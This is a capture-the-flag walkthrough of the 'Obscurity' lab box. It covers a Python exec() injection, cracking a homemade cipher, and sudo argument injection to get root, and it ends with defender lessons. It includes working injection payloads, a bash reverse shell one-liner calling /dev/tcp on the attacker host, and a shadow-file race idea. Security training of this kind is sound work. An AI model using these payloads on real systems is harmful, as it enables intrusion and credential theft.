<h2 id="background">Background</h2>
<h3 id="what-is-security-through-obscurity">What is "Security Through Obscurity"?</h3>
<p>This box is literally named <strong>Obscurity</strong>, and its theme is <em>"security through obscurity."</em> This is a critical concept in cybersecurity:</p>
<blockquote>
<p><strong>Security through obscurity</strong> is the reliance on the secrecy of the design or implementation as the main method of providing security for a system.</p>
</blockquote>
<p>The website even jokes about it: <em>"you can't be hacked if attackers don't know what software you're using!"</em> This is a <strong>fallacy</strong>. Real security comes from strong design, peer review, and assuming the attacker <strong>already knows</strong> how your system works (Kerckhoffs's Principle).</p>
<h3 id="approach-for-this-box">Approach for This Box</h3>
<p>Start by mapping the likely attack paths:</p>
<ol>
<li><strong>Assume nothing is truly hidden.</strong> The devs think their "secret" directory is safe because it's not linked anywhere. We know better.</li>
<li><strong>Source code is the ultimate target.</strong> If we can read the source code of a custom application, we can find vulnerabilities that black-box testing would never reveal.</li>
<li><strong>Custom crypto is almost always broken.</strong> The box advertises an "unbreakable encryption algorithm." In the real world, custom cryptography is a strong indicator. Standard algorithms (AES, RSA, ChaCha20) are standard for a reason -- they've been tested by thousands of cryptographers.</li>
<li><strong>Look for developer mistakes, not complex exploits.</strong> The <code>exec()</code> vulnerability we'll find is a basic Python mistake. The root escalation is a logic flaw in argument parsing. These aren't zero-days -- they're careless coding.</li>
</ol>

<h2 id="step-1-initial-reconnaissance-nmap">Step 1: Initial Reconnaissance (Nmap)</h2>

<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.178
nmap -p 22,8080 -sC -sV -oA scans/nmap 10.129.227.178
</code></pre>

<p><strong>Reconnaissance is the foundation of every penetration test.</strong> You cannot attack what you don't know exists. The first command (<code>-p-</code>) scans all 65,535 TCP ports. The second (<code>-sC -sV</code>) runs default scripts and version detection on the open ports we found.</p>

<p>We're asking: <em>"What services are running? What versions? What can I talk to?"</em></p>
<ul>
<li><strong>Port 22 (SSH):</strong> Standard OpenSSH. Probably not our initial entry point unless we have credentials, but we'll note it for later.</li>
<li><strong>Port 8080 (HTTP):</strong> A web server running something called <code>BadHTTPServer</code>. This is <strong>not</strong> Apache, Nginx, or IIS. It's <strong>custom software</strong> -- immediately interesting because custom software often has custom vulnerabilities.</li>
<li><strong>Ports 80 and 9000 are closed:</strong> Interesting that they send RST packets instead of no-response. This tells us the host is actively rejecting connections on those ports, which might hint at firewall rules or future pivoting opportunities.</li>
</ul>

<blockquote>
<p><strong>Custom services = custom vulnerabilities.</strong> When you see a non-standard service name like <code>BadHTTPServer</code>, your interest should spike. Standard servers have had decades of security patches. Custom servers are often written by developers who aren't security experts.</p>
</blockquote>

<h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>

<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">curl http://10.129.227.178:8080
</code></pre>

<p>Web applications are the most common attack surface. We need to understand what the application does, what technologies it uses, and whether it leaks any information.</p>

<p>We're reading the page like an investigator, not a user. We're not looking at the pretty CSS -- we're looking for:</p>
<ul>
<li>Comments in the source code</li>
<li>Hidden directories or paths</li>
<li>Developer notes or debug information</li>
<li>Technology stack hints</li>
</ul>
<h3 id="what-we-found">What We Found</h3>
<p>The page is a promotional site for "0bscura" -- a company that writes all its own software. The critical finding is in the <strong>Development</strong> section:</p>
<blockquote>
<p>"Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory"</p>
</blockquote>
<h3 id="why-the-finding-matters">Why the finding matters</h3>
<p>This is a <strong>classic information disclosure</strong> vulnerability. The developers left a note for themselves that tells us:</p>
<ol>
<li>The exact filename: <code>SuperSecureServer.py</code></li>
<li>The file exists in a "secret development directory"</li>
<li>The directory is accessible via the web server somehow</li>
</ol>

<blockquote>
<p><strong>Developers often leak critical information in comments, notes, and error messages.</strong> read the full page content and view the page source. What looks like an internal note to a developer is a roadmap to an attacker.</p>
</blockquote>

<h2 id="step-3-discovering-the-secret-directory">Step 3: Discovering the Secret Directory</h2>

<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">grep dev /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &gt; dev_dirs
ffuf -u http://10.129.227.178:8080/FUZZ/SuperSecureServer.py -w dev_dirs -c
</code></pre>

<p>We know the filename (<code>SuperSecureServer.py</code>) and we know it lives in a "secret development directory." We need to find the directory name. Since we can't guess it, we use <strong>brute-force discovery</strong> -- trying thousands of common directory names until one works.</p>
<h3 id="why-ffuf-wfuzz-and-not-gobuster-dirsearch">Why ffuf/wfuzz and Not gobuster/dirsearch?</h3>
<p>The writeups noted that <code>gobuster</code> failed against this custom server because the server sends malformed HTTP responses that crash Go's HTTP parser. <code>ffuf</code> and <code>wfuzz</code> are more tolerant of weird responses.</p>
<h3 id="why-we-filtered-for-dev">Why We Filtered for "dev"</h3>
<p>The hint said "development directory." Instead of brute-forcing 220,000 words, we intelligently filtered the wordlist to only entries containing "dev" -- reducing it to ~343 words. This is <strong>smart brute-forcing</strong>: using context clues to reduce the search space.</p>

<p>We're thinking: <em>"The developers are lazy. They probably used a simple, obvious name like 'dev', 'develop', 'development', or 'devel'. Do not waste time on 'admin', 'backup', or 'test' when we have a strong hint."</em></p>
<h3 id="what-we-found-2">What We Found</h3>
<pre tabindex="0" aria-label="Code or terminal block 4"><code>develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
</code></pre>
<p>The secret directory is <code>/develop</code>.</p>

<blockquote>
<p><strong>Context-aware enumeration is faster than blind brute-forcing.</strong> If you have a hint, use it. A 343-wordlist scan takes seconds; a 220,000-wordlist scan takes minutes and might crash.</p>
</blockquote>

<h2 id="step-4-source-code-analysis">Step 4: Source Code Analysis</h2>

<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">wget http://10.129.227.178:8080/develop/SuperSecureServer.py
cat SuperSecureServer.py
</code></pre>

<p><strong>Source code is the attacker's best friend.</strong> When you can read the source code of a web application, you don't have to guess how it works -- you can see exactly how it processes input, where it sanitizes (or doesn't sanitize) data, and what assumptions the developer made.</p>

<p>We're reading this code like a security auditor. We're not looking for "does it work?" -- we're looking for "how can I break it?"</p>
<p>Key questions we ask:</p>
<ul>
<li>Where does user input enter the system?</li>
<li>Is that input sanitized, validated, or escaped?</li>
<li>Does it reach any dangerous functions (<code>exec</code>, <code>eval</code>, <code>os.system</code>, <code>subprocess</code>, SQL queries, etc.)?</li>
<li>Are there any logic flaws or race conditions?</li>
</ul>
<h3 id="the-vulnerability">The Vulnerability</h3>
<p>In the <code>serveDoc()</code> method, we find:</p>
<pre tabindex="0" aria-label="python code or terminal block 6"><code class="language-python" data-language="python">def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
</code></pre>
<p><strong>Break down why this is catastrophic:</strong></p>
<ol>
<li><strong><code>path</code> comes from the HTTP request URL.</strong> The user completely controls this.</li>
<li><strong><code>urllib.parse.unquote(path)</code></strong> URL-decodes the path. This means <code>%20</code> becomes a space, <code>%27</code> becomes <code>'</code>, etc.</li>
<li><strong><code>info.format(path)</code></strong> inserts the user-controlled path into a Python string.</li>
<li><strong><code>exec()</code> executes that string as Python code.</strong></li>
</ol>
<h3 id="the-developer-s-mistake">The Developer's Mistake</h3>
<p>The developer wanted to create a debug string like:</p>
<pre tabindex="0" aria-label="python code or terminal block 7"><code class="language-python" data-language="python">output = 'Document: /index.html'
</code></pre>
<p>But they used <code>exec()</code> instead of simple assignment. If a user sends:</p>
<pre tabindex="0" aria-label="Code or terminal block 8"><code>/'; os.system('id'); a='
</code></pre>
<p>The formatted string becomes:</p>
<pre tabindex="0" aria-label="python code or terminal block 9"><code class="language-python" data-language="python">output = 'Document: '; os.system('id'); a=''
</code></pre>
<p>The <code>exec()</code> runs this as three separate Python statements:</p>
<ol>
<li><code>output = 'Document: '</code> (harmless assignment)</li>
<li><code>os.system('id')</code> (<strong>REMOTE CODE EXECUTION</strong>)</li>
<li><code>a=''</code> (harmless assignment)</li>
</ol>
<h3 id="why-os-is-available">Why <code>os</code> Is Available</h3>
<p>Notice at the top of the file:</p>
<pre tabindex="0" aria-label="python code or terminal block 10"><code class="language-python" data-language="python">import os
</code></pre>
<p>Because <code>os</code> is already imported into the script's namespace, our injected code can use it directly without needing to import it ourselves.</p>

<blockquote>
<p><strong><code>exec()</code> and <code>eval()</code> with user input is always dangerous.</strong> There is virtually no safe way to use these functions with untrusted data. If you see <code>exec()</code>, <code>eval()</code>, or <code>pickle.loads()</code> in code that processes user input, you've probably found your vulnerability.</p>
</blockquote>

<h2 id="step-5-exploiting-python-exec-injection">Step 5: Exploiting Python exec() Injection</h2>
<h3 id="proof-of-concept-ping">Proof of Concept (Ping)</h3>
<p><strong>Terminal 1 (Listener):</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">sudo tcpdump -i tun0 icmp
</code></pre>
<p><strong>Terminal 2 (Attack):</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">curl "http://10.129.227.178:8080/';os.system('ping%20-c%201%2010.10.16.84');'"
</code></pre>
<h3 id="why-we-test-with-ping-first">Why We Test with Ping First</h3>
<p>Before we try to get a full shell, we use a <strong>blind command execution test</strong>. Why?</p>
<ul>
<li>We might not see direct output from the web server.</li>
<li>A ping is safe, non-destructive, and confirms execution.</li>
<li>If we get ICMP packets back, we <strong>know</strong> our injection syntax is correct.</li>
</ul>
<h3 id="why-this-payload-works">Why This Payload Works</h3>
<p>Trace the payload through the code:</p>
<ol>
<li><strong>HTTP Request:</strong> <code>GET /';os.system('ping%20-c%201%2010.10.16.84');' HTTP/1.1</code></li>
<li><strong>Request.doc:</strong> <code>';os.system('ping%20-c%201%2010.10.16.84');'</code></li>
<li><strong>URL Decode:</strong> <code>';os.system('ping -c 1 10.10.16.84');'</code></li>
<li><strong>String Format:</strong> <code>output = 'Document: ';os.system('ping -c 1 10.10.16.84');''</code></li>
<li><strong>Exec() runs it.</strong> The middle statement executes <code>ping -c 1 10.10.16.84</code>.</li>
</ol>

<p>We're being methodical: <em>"Don't rush to a reverse shell. Confirm the primitive first. If the ping works, the shell will work. If the ping fails, I need to debug my payload syntax before I waste time on a listener."</em></p>
<h3 id="getting-the-reverse-shell">Getting the Reverse Shell</h3>
<p><strong>Terminal 1 (Listener):</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">nc -lvnp 443
</code></pre>
<p><strong>Terminal 2 (Attack):</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">curl "http://10.129.227.178:8080/';os.system('bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/10.10.16.84/443%200%3E&amp;1%22');'"
</code></pre>
<h3 id="why-this-payload">Why This Payload?</h3>
<p>We're using a <strong>bash reverse shell one-liner</strong>:</p>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1"
</code></pre>
<p>This creates an interactive bash session that redirects:</p>
<ul>
<li><code>stdout</code> and <code>stderr</code> (<code>&gt;&amp;</code>) to a TCP connection to our Kali machine</li>
<li><code>stdin</code> (<code>0&gt;&amp;1</code>) from that same connection</li>
</ul>
<p>We wrap it in <code>bash -c</code> because the <code>os.system()</code> call needs a single command string. We URL-encode spaces and special characters so the HTTP request is valid.</p>

<blockquote>
<p><strong>Verify your exploit primitive with a safe test (ping/dns) before deploying a reverse shell.</strong> This saves time debugging whether your shell failed because of networking issues, firewall rules, or bad payload syntax.</p>
</blockquote>

<h2 id="step-6-stabilizing-the-shell">Step 6: Stabilizing the Shell</h2>

<pre tabindex="0" aria-label="bash code or terminal block 16"><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
reset
</code></pre>

<p>A <strong>basic netcat shell</strong> is limited:</p>
<ul>
<li>No command history (arrow keys don't work)</li>
<li>No tab completion</li>
<li>No clear command</li>
<li><code>Ctrl+C</code> kills the shell instead of cancelling a command</li>
<li>Some commands (like <code>sudo</code>, <code>vim</code>, <code>ssh</code>) require a TTY (terminal device)</li>
</ul>
<h3 id="what-pty-does">What PTY Does</h3>
<p>PTY stands for <strong>Pseudo-Terminal</strong>. It makes our shell behave like a real terminal session. The <code>stty raw -echo</code> command on our Kali machine tells our local terminal to pass keystrokes directly to the remote shell without interpreting them locally.</p>

<p>We're thinking: <em>"I have a shell, but it's fragile. Before I start exploring and running complex commands, I need a stable environment. A broken shell during privilege escalation could mean losing access and having to start over."</em></p>

<blockquote>
<p><strong>Stabilize your shell immediately.</strong> Don't explore the target with a bare netcat shell. A PTY shell prevents accidental disconnections and enables commands that require interactive input.</p>
</blockquote>

<h2 id="step-7-post-exploitation-enumeration">Step 7: Post-Exploitation Enumeration</h2>

<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">cd /home/robert &amp;&amp; ls -la
cat check.txt
cat out.txt
cat passwordreminder.txt
python3 SuperSecureCrypt.py -h
</code></pre>

<p>Now that we have a stable shell as <code>www-data</code>, we need to <strong>escalate privileges</strong>. The first place to look is always <code>/home</code> -- user home directories often contain:</p>
<ul>
<li>SSH keys</li>
<li>Passwords or password hints</li>
<li>Configuration files with credentials</li>
<li>Scripts or applications with vulnerabilities</li>
</ul>
<h3 id="what-we-found-3">What We Found</h3>
<pre tabindex="0" aria-label="Code or terminal block 18"><code>check.txt            - plaintext message
out.txt              - encrypted output
passwordreminder.txt - encrypted password reminder
SuperSecureCrypt.py  - the encryption program
user.txt             - the user flag (unreadable by www-data)
</code></pre>

<p>We're seeing a pattern: the box gives us both the <strong>encryption tool</strong> and a <strong>known plaintext/ciphertext pair</strong>. This is a strong hint. The developer left <code>check.txt</code> (plaintext) and <code>out.txt</code> (ciphertext) as a way to verify the encryption key works. For an attacker, this is a gift.</p>
<p>We're thinking: <em>"If I can figure out how this encryption works, I can use the known plaintext to recover the key. Then I can decrypt the password reminder and get robert's password."</em></p>

<blockquote>
<p><strong>Check user home directories thoroughly.</strong> Look for scripts, text files, and anything that stands out. Developers often leave test files, credentials, or hints that make privilege escalation trivial.</p>
</blockquote>
<hr>
<h2 id="step-8-cryptographic-analysis-known-plaintext-attack">Step 8: Cryptographic Analysis (Known-Plaintext Attack)</h2>
<h3 id="understanding-the-encryption">Understanding the Encryption</h3>
<p>Looking at <code>SuperSecureCrypt.py</code>:</p>
<pre tabindex="0" aria-label="python code or terminal block 19"><code class="language-python" data-language="python">def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted
</code></pre>
<h3 id="breaking-down-the-math">Breaking Down the Math</h3>
<p>This is essentially a <strong>Vigenere cipher</strong> with modulo 255 instead of 26:</p>
<ul>
<li><strong>Encryption:</strong> <code>cipher_char = (plain_char + key_char) % 255</code></li>
<li><strong>Decryption:</strong> <code>plain_char = (cipher_char - key_char) % 255</code></li>
</ul>
<h3 id="why-custom-crypto-is-bad">Why Custom Crypto Is Bad</h3>
<p>Real-world encryption uses algorithms like AES because:</p>
<ol>
<li>They resist known-plaintext attacks</li>
<li>They use complex substitution-permutation networks</li>
<li>They have been analyzed by cryptographers for decades</li>
</ol>
<p>This custom algorithm is just <strong>repeated addition</strong>. If you know any plaintext and its ciphertext, you can solve for the key:</p>
<pre tabindex="0" aria-label="Code or terminal block 20"><code>key_char = (cipher_char - plain_char) % 255
</code></pre>
<h3 id="the-attack-using-the-script-against-itself">The Attack: Using the Script Against Itself</h3>
<p>We have:</p>
<ul>
<li><code>check.txt</code> = plaintext</li>
<li><code>out.txt</code> = ciphertext of check.txt</li>
</ul>
<p>If we "decrypt" <code>out.txt</code> using <code>check.txt</code> as the "key," the math works out to:</p>
<pre tabindex="0" aria-label="Code or terminal block 21"><code>result = (cipher_char - plain_char) % 255 = key_char
</code></pre>
<p>So we run:</p>
<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">python3 SuperSecureCrypt.py -i out.txt -k "$(cat check.txt)" -d -o /tmp/key.txt
cat /tmp/key.txt
</code></pre>
<p><strong>Output:</strong> <code>alexandrovichalexandrovichalexandrovich...</code></p>
<p>The key is <strong><code>alexandrovich</code></strong>.</p>
<h3 id="decrypting-the-password">Decrypting the Password</h3>
<p>Now that we have the key:</p>
<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o /tmp/passwd.txt
cat /tmp/passwd.txt
</code></pre>
<p><strong>Output:</strong> <code>SecThruObsFTW</code></p>

<p>We're thinking: <em>"The developer wanted to test their encryption, so they left a plaintext/ciphertext pair. They didn't realize this completely breaks their cipher. This is why Kerckhoffs's Principle says the security of a cipher should depend ONLY on the key, not on keeping the algorithm secret."</em></p>

<blockquote>
<p><strong>Do not roll your own cryptography.</strong> And if you find custom crypto on a target, look for known-plaintext or chosen-plaintext opportunities. Test files, example outputs, and encrypted data with predictable structure (like JSON, XML, or English text headers) are all potential attack vectors.</p>
</blockquote>

<h2 id="step-9-privilege-escalation-to-robert">Step 9: Privilege Escalation to robert</h2>

<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">su robert
# Password: REDACTED
cat /home/robert/user.txt
</code></pre>

<p>Now that we have robert's password, we can authenticate as him. We use <code>su</code> (switch user) instead of SSH because we already have a shell on the box -- no need to make a new network connection.</p>
<h3 id="what-we-found-4">What We Found</h3>
<p><strong>User flag:</strong> <code>7603f0f[redacted]35349696</code></p>

<p>We're now thinking about the next target: root. Before we hunt for root, we check what privileges robert has.</p>

<h2 id="step-10-root-privilege-escalation">Step 10: Root Privilege Escalation</h2>
<h3 id="checking-sudo-privileges">Checking sudo Privileges</h3>
<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p><strong>Output:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 26"><code>User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
</code></pre>
<h3 id="why-this-is-interesting">Why This Is Interesting</h3>
<p><code>sudo -l</code> tells us what commands robert can run as root without a password. The only entry is a <strong>custom Python script</strong> -- another instance of custom software. Custom software running with elevated privileges is a <strong>privilege escalation useful sources</strong>.</p>
<h3 id="analyzing-betterssh-py">Analyzing BetterSSH.py</h3>
<p>The script:</p>
<ol>
<li>Reads a username and password from the user</li>
<li>Copies <code>/etc/shadow</code> to <code>/tmp/SSH/[random_name]</code></li>
<li>Sleeps for 0.1 seconds</li>
<li>Validates the password against the shadow hash</li>
<li>If authenticated, enters a loop that runs commands via <code>sudo -u [user]</code></li>
</ol>
<p>The critical code is:</p>
<pre tabindex="0" aria-label="python code or terminal block 27"><code class="language-python" data-language="python">command = input(session['user'] + "@Obscure$ ")
cmd = ['sudo', '-u',  session['user']]
cmd.extend(command.split(" "))
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
</code></pre>
<h3 id="finding-the-vulnerability">Finding the Vulnerability</h3>
<p>The script builds the command list as:</p>
<pre tabindex="0" aria-label="python code or terminal block 28"><code class="language-python" data-language="python">cmd = ['sudo', '-u', 'robert']
# Then extends with our input
cmd = ['sudo', '-u', 'robert', '-u', 'root', 'cat', '/root/root.txt']
</code></pre>
<p><strong>How <code>sudo</code> handles multiple <code>-u</code> flags:</strong> When <code>sudo</code> receives multiple <code>-u</code> options, the <strong>last one wins</strong>. This is standard behavior for many command-line tools.</p>
<p>So <code>sudo -u robert -u root cat /root/root.txt</code> executes as <strong>root</strong>.</p>

<p>We're analyzing the script as if we wrote it. We ask:</p>
<ul>
<li><em>"What assumptions did the developer make?"</em> They assumed the user would only enter simple commands.</li>
<li><em>"What can I inject?"</em> The <code>command.split(" ")</code> splits on spaces, but <code>sudo</code> parses arguments sequentially. Adding <code>-u root</code> before our real command hijacks the privilege level.</li>
<li><em>"Why does this work?"</em> Because the developer trusted user input to be a simple command, not a command with its own flags.</li>
</ul>
<h3 id="exploitation">Exploitation</h3>
<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">mkdir -p /tmp/SSH
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
# Enter username: robert
# Enter password: REDACTED
# Authed!
# robert@Obscure$ -u root cat /root/root.txt
</code></pre>
<p><strong>Root flag:</strong> <code>ea0cac[redacted]695d4b6d</code></p>
<h3 id="why-we-created-tmp-ssh-first">Why We Created /tmp/SSH First</h3>
<p>The script writes the shadow file to <code>/tmp/SSH/[random]</code>. If <code>/tmp/SSH</code> doesn't exist, the script crashes with a <code>FileNotFoundError</code>. This is a small detail that could block exploitation if we didn't know about it.</p>

<blockquote>
<p><strong>When analyzing sudo privileges, always read the source code of custom scripts.</strong> Look for:</p>
<ul>
<li><code>subprocess.Popen</code>, <code>os.system</code>, or <code>exec</code> with user input</li>
<li>Command-line argument injection opportunities</li>
<li>Race conditions (file operations with predictable paths or timing windows)</li>
<li>Path hijacking (directories in PATH that are writable by the user)</li>
</ul>
</blockquote>
<hr>
<h2 id="alternative-root-paths">Alternative Root Paths</h2>
<h3 id="path-1-race-condition-on-shadow-file">Path 1: Race Condition on Shadow File</h3>
<p>The script writes <code>/etc/shadow</code> to <code>/tmp/SSH/[random_name]</code> and leaves it there for <strong>0.1 seconds</strong>. An attacker could:</p>
<ol>
<li>Run a loop constantly reading <code>/tmp/SSH/*</code></li>
<li>Run BetterSSH simultaneously</li>
<li>Catch the shadow file before it's deleted</li>
<li>Crack the root password hash with <code>john</code> or <code>hashcat</code></li>
</ol>
<p><strong>Mechanism:</strong> The developer assumed 0.1 seconds was "too fast" to exploit. On a modern CPU, 0.1 seconds is an eternity.</p>
<h3 id="path-2-directory-replacement">Path 2: Directory Replacement</h3>
<p>If robert had write access to the <code>BetterSSH</code> directory, he could:</p>
<ol>
<li><code>mv BetterSSH BetterSSH-old</code></li>
<li><code>mkdir BetterSSH</code></li>
<li>Write a malicious <code>BetterSSH.py</code> that spawns a root shell</li>
<li>Run <code>sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code></li>
</ol>
<p><strong>Mechanism:</strong> <code>sudo</code> checks the path, not the file contents. If you can replace the directory or file, you control what runs as root.</p>
<p><strong>Note:</strong> In our instance, this was patched -- the <code>BetterSSH</code> directory was owned by root and not writable by robert.</p>
<h3 id="path-3-python-path-hijacking-patched">Path 3: Python Path Hijacking (Patched)</h3>
<p>Python loads modules from the script's directory first. If <code>BetterSSH/</code> was writable, robert could create a fake <code>subprocess.py</code> in that directory. When BetterSSH imported <code>subprocess</code>, it would load robert's malicious version instead of the system library.</p>
<p><strong>Mechanism:</strong> Python's module resolution prioritizes the local directory. This is well-known behavior that many developers forget about.</p>
<h3 id="path-4-lxd-group-patched">Path 4: LXD Group (Patched)</h3>
<p>At release, robert was in the <code>lxd</code> group. Members of the <code>lxd</code> group can create privileged containers that mount the host filesystem. An attacker could:</p>
<ol>
<li>Import an Alpine Linux container image</li>
<li>Create a privileged container with the host root mounted as <code>/mnt/root</code></li>
<li>Access any file on the host as root</li>
</ol>
<p><strong>Mechanism:</strong> LXD containers share the kernel with the host. A privileged container has root access to the host's kernel namespaces and mounted filesystems.</p>
<hr>
<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="for-attackers">For Attackers</h3>
<ol>
<li><strong>Custom software is fertile ground for vulnerabilities.</strong> prioritize custom applications over standard, well-tested services.</li>
<li><strong>Source code access changes everything.</strong> A single source file leak can turn a black-box test into a code audit.</li>
<li><strong>Do not underestimate implementation shortcuts.</strong> "Secret" directories, hardcoded credentials, debug comments, and test files are everywhere.</li>
<li><strong>Custom cryptography is a vulnerability, not a feature.</strong> If you see homegrown encryption, look for known-plaintext attacks.</li>
<li><strong>Sudo on custom scripts is dangerous.</strong> analyze what the script does and how it handles user input.</li>
</ol>
<h3 id="for-defenders">For Defenders</h3>
<ol>
<li><strong>Do not use <code>exec()</code> or <code>eval()</code> with user input.</strong> There is no safe way to do this.</li>
<li><strong>Don't rely on obscurity.</strong> Hiding your source code or using custom algorithms doesn't make you secure.</li>
<li><strong>Remove debug code and comments before deployment.</strong> That "note to devs" gave away the entire attack path.</li>
<li><strong>Use standard cryptography.</strong> AES, RSA, and ChaCha20 exist for a reason.</li>
<li><strong>Audit custom scripts running with elevated privileges.</strong> Especially any script that uses <code>subprocess</code>, <code>os.system</code>, or handles user input.</li>
<li><strong>Set strict permissions on sensitive directories.</strong> If a directory contains a script that runs as root, no unprivileged user should be able to rename, modify, or write to it.</li>
</ol>
